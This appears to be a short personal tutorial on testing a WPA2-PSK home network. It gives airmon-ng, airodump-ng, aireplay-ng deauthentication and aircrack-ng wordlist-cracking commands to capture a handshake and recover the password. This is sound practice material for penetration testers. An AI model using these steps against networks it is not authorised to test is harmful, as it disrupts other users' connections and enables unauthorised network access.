[*] Wireless Penetration Testing

[*] Types:

1. WPA2 PSK
2. WPA2 Enterprise(We Wont Cover)

[*] Activities Performed:

1. Evaluating Strenght Of PSK
2. Reviewing Nearby Networks
3. Assessing Guest Networks
4. Checking Network Access

[*] Tools:

1. Wireless Card(Recommended: Alfa AWUD036NH, Capable Of Packet Injection)
[*] Note: This Is Necessary: https://null-byte.wonderhowto.com/how-to/check-if-your-wireless-network-adapter-supports-monitor-mode-packet-injection-0191221/
2. Router(Recommended: Your Home Router)
3. Laptop Or PC

[*] Processes:

1. Place
2. Discover
3. Select
4. Perform
5. Capture
6. Attempt

[*] Attacking:

[*] Plug In Your Wireless Card And Configure It. 
[*] Run iwconfig To Check
[*] Run:

airmon-ng check kill

[*] This Will Kill The Wireless Processes. Now Turn On Monitor Mode Using:

airmon-ng start wlan0 (Can Be Different)

[*] Run iwconfig Once Again And You Should See wlan0mon. You Are Good To Go. 
[*] Now Run:

airodump-ng wlan0mon

[*] This Should Show The Nearby Devices
[*] When You See Your Router In The List, Hit Ctrl+C. Now Note The Channel(CH) And BSSID Of Your Router. Mine Is 6 And I Didn't Copy The BSSID :(
[*] Now Run:

airodump-ng -c <Channel> --bssid <BSSID> -w <AnyName> wlan0mon

[*] Now Let It Run And On Another Tab Lets Run A Deauth Attack
[*] Command:

aireplay-ng -0 1 -a <BSSID> -c <StationYouSeeInAirodump> wlan0mon

[*] We See WPA Handshake On The Top Of Our airodump Screen!
[*] If This Doesn't Work, Try Again!

[*] Now You Should See A <AnyThing>.cap File. Lets Crack It. 

aircrack-ng -w <Wordlist> -b <BSSID> <YourCAPFile>

[*] We Got The Password!